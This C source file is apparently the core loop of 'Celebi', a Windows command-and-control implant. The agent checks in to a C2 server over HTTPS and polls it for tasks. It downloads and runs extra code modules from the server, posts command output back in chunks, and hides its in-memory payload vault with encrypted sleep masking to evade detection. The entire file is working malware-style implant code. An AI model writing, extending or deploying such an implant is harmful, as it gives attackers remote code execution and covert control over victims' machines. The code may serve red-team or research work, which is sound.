#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char ENC_PARAMS[1024] __attribute__((section(".text")));
char ENC_KEY[128]      __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
WINBASEAPI VOID WINAPI KERNEL32$ExitThread(DWORD dwExitCode);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
WINBASEAPI char *MSVCRT$strtok(char *strToken, const char *strDelimit);
WINBASEAPI int MSVCRT$atoi(const char *str);

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void sleep_mask(AgentState *state) {
	// Resolve built-in PICOs used for masking.
	ResolvedPico mask_vault = { 0 };
	ResolvedPico mask_sleep = { 0 };
	
	resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_vault, state->builtin_picos.mask_vault); // no error handling for now TODO
	resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_sleep, state->builtin_picos.mask_sleep); // no error handling for now TODO
	
	MASK_VAULT_PICO mask_vault_entrypoint = (MASK_VAULT_PICO) mask_vault.entrypoint;
	MASK_SLEEP_PICO mask_sleep_entrypoint = (MASK_SLEEP_PICO) mask_sleep.entrypoint;

	// Mask vault.
	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }

	// Sleep (TODO no logic for masking the agent itself)
	mask_sleep_entrypoint(NULL, state->sleep_time, ENC_KEY, ENC_KEY_LEN);
	// Unmask vault.
	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
	
	// Free resolved PICOs.
	free_resolved_pico(&mask_vault);
	free_resolved_pico(&mask_sleep);
}

void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
	TaskPostReply reply = { 0 };
	BOOL result;
	
	size_t out_len = MSVCRT$strlen(output);
	
	// If the message is short, just send it.
	if (out_len <= MAXIMUM_POST_SIZE) {
		result = perform_post(state, task, &reply, output, success);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
		
		return;
	}
	
	// Otherwise, break it up into chunks.
	for (int i = 0; i < out_len; i += MAXIMUM_POST_SIZE) {
		int next_len = i + MAXIMUM_POST_SIZE < out_len ? MAXIMUM_POST_SIZE : (out_len - i);
		char *next = KERNEL32$VirtualAlloc(0, next_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int j = 0; j < next_len; j++) {
			next[j] = output[i+j];
		}
		result = perform_post(state, task, &reply, next, success);
		KERNEL32$VirtualFree(next, 0, MEM_RELEASE);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
	}
}

void agent_sleep(AgentState *state, TaskInfo *task) {
	int interval = MSVCRT$atoi(task->parameters);
	state->sleep_time = interval;
	
	#ifdef CELEBI_DEBUG
	dprintf("Changed sleep interval to: %i", state->sleep_time);
	#endif
	
	agent_post(state, task, "", STR(STATUS_SUCCESS));
}

void agent_exit(AgentState *state, TaskInfo *task) {
	if (task != NULL) {
		agent_post(state, task, "", STR(STATUS_SUCCESS));
	}

	HttpDestroy(state->http);
	free_params(&state->params);
	free_vault(&state->file_vault);
	
	#ifdef CELEBI_EXIT_THREAD
	KERNEL32$ExitThread(0);
	#else
	KERNEL32$ExitProcess(0);
	#endif
}

void agent_whoami(AgentState *state, TaskInfo *task) {
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.whoami);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", state->builtin_picos.whoami);
		#endif
		
		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
		return;
	}
	
	WHOAMI_PICO entrypoint = (WHOAMI_PICO) pico.entrypoint;
	char *whoami_output = entrypoint();
	
	if (whoami_output != NULL) {
		agent_post(state, task, whoami_output, STR(STATUS_SUCCESS));
		KERNEL32$VirtualFree(whoami_output, 0, MEM_RELEASE);
	} else {
		agent_post(state, task, "", STR(STATUS_COMMAND_FAILED));
	}
	
	free_resolved_pico(&pico);
}

void agent_register(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "", STR(STATUS_MISSING_FILENAME));
		return;
	}

	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *uuid = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, name) == TRUE) {
		agent_post(state, task, "", STR(STATUS_DUPLICATE_FILENAME));
		return;
	}

	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, uuid);
	
	while (upload.finished == FALSE) {
		BOOL result = perform_upload(state, &upload);
		if (result == FALSE) {
			upload.error = TRUE;
			break;
		}
	}
	
	#ifdef CELEBI_DEBUG
	if (upload.error == FALSE) {
		dprintf("Retrieved a file from server, final size: %u", upload.buflen);
	} else {
		dprintf("Failed to retrieve a file from the server");
	}
	#endif

	if (upload.error == TRUE) {
		agent_post(state, task, "", STR(STATUS_UPLOAD_FAILED));
	} else if (add_to_vault(&state->file_vault, name, upload.current_buffer, upload.buflen) == TRUE) {
		agent_post(state, task, name, STR(STATUS_SUCCESS));
	} else {
		agent_post(state, task, "", STR(STATUS_VAULT_FULL));
	}
	
	free_upload_manager(&upload);
}

void agent_unregister(AgentState *state, TaskInfo *task) {
	char *name = task->parameters;
	
	BOOL result = remove_from_vault(&state->file_vault, name);
	
	#ifdef CELEBI_DEBUG
	if (result == FALSE) {
		dprintf("Failed to remove '%s' from vault", name);
	} else {
		dprintf("Successfully removed '%s' from vault", name);
	}
	#endif
	
	if (result == TRUE) {
		agent_post(state, task, "", STR(STATUS_SUCCESS)); 
	} else {
		agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
	}
}

void agent_execute_pico(AgentState *state, TaskInfo *task) {
	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *args = MSVCRT$strtok(NULL, "\t");
	
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, name);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", name);
		#endif
		
		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
		return;
	}
	
	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
	char *pico_output = entrypoint(args);
	
	if (pico_output != NULL) {
		agent_post(state, task, pico_output, STR(STATUS_SUCCESS));
	} else {
		agent_post(state, task, "", STR(STATUS_SUCCESS));
	}
	
	free_resolved_pico(&pico);
}

void agent_morph(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "", STR(STATUS_MISSING_COMMAND));
		return;
	}

	char *cmd = MSVCRT$strtok(task->parameters, "\t");
	char *pico = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, pico) == FALSE) {
		agent_post(state, task, "", STR(STATUS_UNKNOWN_PICO));
		return;
	}
	
	if (MSVCRT$strcmp(cmd, "whoami") == 0) {
		if (remove_from_vault(&state->file_vault, state->builtin_picos.whoami) == FALSE) {
			agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
			return;
		}
		
		state->builtin_picos.whoami = clone_str(pico);
		agent_post(state, task, "", STR(STATUS_SUCCESS));
		return;
	}
	
	agent_post(state, task, "", STR(STATUS_UNKNOWN_COMMAND));
}

void process_task(TaskInfo *task, AgentState *state) {
	if (MSVCRT$strcmp(task->command, "exit") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received exit command.");
		#endif
		
		agent_exit(state, task);
		return;
	}

	if (MSVCRT$strcmp(task->command, "sleep") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received sleep command with parameters: '%s'", task->parameters);
		#endif
		
		agent_sleep(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "whoami") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received whoami command.");
		#endif
		
		agent_whoami(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "register") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received register command with parameters: '%s'", task->parameters);
		#endif
		
		agent_register(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "unregister") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received unregister command with parameters: '%s'", task->parameters);
		#endif
		
		agent_unregister(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "execute_pico") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received execute_pico command with parameters: '%s'", task->parameters);
		#endif
		
		agent_execute_pico(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "morph") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received morph command with parameters: '%s'", task->parameters);
		#endif
		
		agent_morph(state, task);
		return;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
	#endif
}

void go() {
	AgentState state = { 0 };
	state.sleep_time = DEFAULT_SLEEP_TIME;
	
	unpack_params(ENC_PARAMS, ENC_KEY, ENC_KEY_LEN, &state.params);
	
	#ifdef CELEBI_DEBUG
	dprintf("Parameters unpacked.");
	#endif
	
	state.file_vault = new_vault();
	
	#ifdef CELEBI_DEBUG
	dprintf("Vault allocated.");
	#endif
	
	state.funcs = resolve_pico_functions();

	#ifdef CELEBI_DEBUG
	dprintf("Resolved PICO loading functions.");
	#endif
	
	state.builtin_picos = load_builtin_picos(&state.file_vault, ENC_KEY, ENC_KEY_LEN);
	
	#ifdef CELEBI_DEBUG
	dprintf("Loaded PICO capabilities.");
	#endif
	
	state.http = HttpInit(state.params.callback_https);
	
	#ifdef CELEBI_DEBUG
	dprintf("Checking in...");
	#endif
	
	CheckinReply checkin_reply = { 0 };
	BOOL checkin_result = perform_checkin(&state, &checkin_reply);
	
	if ((checkin_result == FALSE) || (checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		#ifdef CELEBI_DEBUG
		dprintf("Checkin failed with: %s", checkin_reply.status);
		#endif
		
		free_checkin_reply(&checkin_reply);
		agent_exit(&state, NULL);
		return;
	}
	
	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
	free_checkin_reply(&checkin_reply);
	
	#ifdef CELEBI_DEBUG
	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
	#endif
	
	remove_from_vault(&state.file_vault, state.builtin_picos.checkin);
	state.builtin_picos.checkin = "(UNALLOCATED)";
	
	while (1) {
		sleep_mask(&state);
		
		TaskingReply tasking_reply = { 0 };
		BOOL task_result = perform_tasking(&state, &tasking_reply);
		
		#ifdef CELEBI_DEBUG
		if (task_result == TRUE) {
			dprintf("Received tasking from C2 server!");
		} else {
			dprintf("Failed to get tasking from C2 server.");
		}
		#endif
		
		if (task_result == FALSE) {
			continue;
		}
		
		for (int i = 0; i < tasking_reply.tasking_size; i++) {
			process_task(&tasking_reply.tasks[i], &state);
		}
		
		free_tasking_reply(&tasking_reply);
	}
}
